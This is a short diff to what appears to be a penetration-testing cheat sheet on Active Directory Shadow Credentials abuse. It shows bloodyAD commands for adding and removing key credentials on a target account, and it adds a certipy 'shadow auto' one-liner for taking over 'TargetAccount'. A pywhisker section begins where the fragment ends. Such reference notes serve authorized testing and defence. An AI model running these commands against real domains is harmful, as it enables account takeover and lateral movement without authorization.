@@ -15,6 +15,11 @@ bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add shadowCredent
 bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" remove shadowCredentials targetpc$ --key <key from previous output>
 ```
 
+#### certipy
+```sh
+certipy shadow auto -username "$USER"@"$DOMAIN" -password "$PASSWORD" -k -account "TargetAccount" -target "$DC"
+```
+
 #### pywhisker
 ```sh
 # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
